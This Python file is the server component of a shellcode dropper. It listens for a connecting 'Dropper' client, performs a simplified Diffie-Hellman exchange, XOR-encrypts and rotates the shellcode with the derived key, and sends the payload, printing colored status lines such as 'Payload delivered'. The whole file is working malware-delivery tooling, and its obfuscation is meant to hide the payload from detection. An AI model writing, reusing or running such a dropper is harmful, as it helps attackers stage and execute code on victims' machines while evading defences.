import socket
import random
from termcolor import colored

def diffie_hellman(conn):
	P=251
	G=6
	a=random.randint(2, G)

	A = pow(G, a, P)
	conn.send(str(A).encode()) #sending A to client

	B = conn.recv(4096) #recieving B from client
	B= B.decode()
	B=int(B.split("\x00")[0])
	
	key = pow(G, A*B, P)
	return key

def obfuscate(shellcode, key):
	lol=b""
	
	for i in range(len(shellcode)):
		lol+=(key^int(shellcode[i], 16)).to_bytes(1, "little")
		
	#left rotate
	lol=lol[key%(len(shellcode)): ] + lol[0: key%(len(shellcode))] 
		
	return lol

def drop(shellcode, ip, port):
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
		sock.bind((ip, port))
		sock.listen(1)
		conn, addr=sock.accept()

		print(colored('[+] ', 'magenta') + colored('Dropper', 'red') + f" connected from {colored(addr[0], 'green')} {colored(addr[1], 'green')}")
		
		send=b''
		for b in shellcode:
			send+=bytes.fromhex(b[2:].rjust(2, '0'))

		key=diffie_hellman(conn)
		print(colored('[+] ', 'magenta') + colored('Diffie Hellman', 'red') + f" key exchange successful with {colored('key=', 'green')}{colored(key, 'green')}")
		send=obfuscate(shellcode, key)
		
		print(colored('[+] ', 'magenta') + colored('Payload', 'red') + f" encrypted with {colored(key, 'green')} and rotated by offset {colored(key%(len(shellcode)), 'green')}")
		try:
			conn.sendall(send)
			print(colored('[+] ', 'magenta') + colored('Payload', 'red') + f" delivered to {colored(addr[0], 'green')} {colored(addr[1], 'green')}")
			conn.close()
			sock.close()
			return 0
		except :
			print(colored('[-] ', 'magenta') + colored('Failed', 'red') + " to deliver payload. Connection closed")
			conn.close()
			sock.close()
			return 1
